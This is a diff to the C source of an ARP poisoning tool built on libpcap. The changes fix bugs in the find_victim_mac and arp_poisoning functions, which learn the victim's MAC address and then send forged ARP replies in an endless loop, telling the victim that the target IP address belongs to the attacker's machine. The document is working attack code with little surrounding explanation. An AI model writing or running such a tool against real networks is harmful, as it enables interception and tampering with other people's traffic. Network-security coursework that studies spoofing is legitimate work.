@@ -145,7 +145,7 @@ void find_victim_mac(pcap_t * handle) {
 		// check if opcode is 0x02 (arp reply)
 		if (ether_type == ETHERTYPE_ARP && opcode == 0x02) {
 
-			char dest_mac[MAC_SIZE];	
+			char dest_mac[MAC_SIZE];	// my mac
 			sprintf(dest_mac, "%02x:%02x:%02x:%02x:%02x:%02x", 
 				eh->ether_dhost[0],
 				eh->ether_dhost[1],
@@ -154,7 +154,7 @@ void find_victim_mac(pcap_t * handle) {
 				eh->ether_dhost[4],
 				eh->ether_dhost[5]);
 
-			char source_mac[MAC_SIZE];
+			char source_mac[MAC_SIZE]; // victim mac
 			sprintf(source_mac, "%02x:%02x:%02x:%02x:%02x:%02x", 
 				eh->ether_shost[0],
 				eh->ether_shost[1],
@@ -167,8 +167,9 @@ void find_victim_mac(pcap_t * handle) {
 			//printf("dest mac : %s\n", dest_mac);
 
 			strcpy(victim_mac, ether_ntoa((const struct ether_addr *)eh->ether_shost));
-			printf("[*] victim mac : %s\n", victim_mac);
-			memcpy(&victim_mac_bin, eh->ether_shost, 6);
+			printf("[*] victim mac : %s\n", source_mac);
+			ether_aton_r(source_mac, &victim_mac_bin);
+			// memcpy(&victim_mac_bin, eh->ether_shost, 6);
 			//printf("debug : %x %x %x %x\n", victim_mac_bi;
 			break;
 		} // end if
@@ -184,7 +185,7 @@ void arp_poisoning(pcap_t * handle) {
 	// attack to victim(sender) target mac is my mac
 	// make eth header
 	struct ethhdr eth_header;
-	memset(eth_header.h_dest, &victim_mac_bin, 6);	 // victim mac (sender mac)
+	memcpy(eth_header.h_dest, &victim_mac_bin, 6);	 // victim mac (sender mac)
 	memcpy(eth_header.h_source, &my_mac_bin, 6);	// source mac == my mac
 	eth_header.h_proto = htons(ETHERTYPE_ARP);	// ether type == 0x0806
 
@@ -200,7 +201,7 @@ void arp_poisoning(pcap_t * handle) {
 	memcpy(arp_header.arp_sha, &my_mac_bin, 6);	// source mac (my mac)
 	inet_pton(AF_INET, target_ip, &arp_header.arp_spa);	// source ip (target ip) (argv[3])
 
-	memset(arp_header.arp_tha, &victim_mac_bin, 6);	// destination mac
+	memcpy(arp_header.arp_tha, &victim_mac_bin, 6);	// destination mac
 	inet_pton(AF_INET, victim_ip, &arp_header.arp_tpa);	// destination ip (victim ip)
 
 	memcpy(packet, &eth_header, 14); // ethernet header
@@ -208,6 +209,8 @@ void arp_poisoning(pcap_t * handle) {
 
 	// send arp packet
 	// arp poisoning
+
+	int cnt = 1;
 	while(1) {
 		printf("arp poisoning...\n");
 		if (pcap_sendpacket(handle, packet, 42) != 0) { 
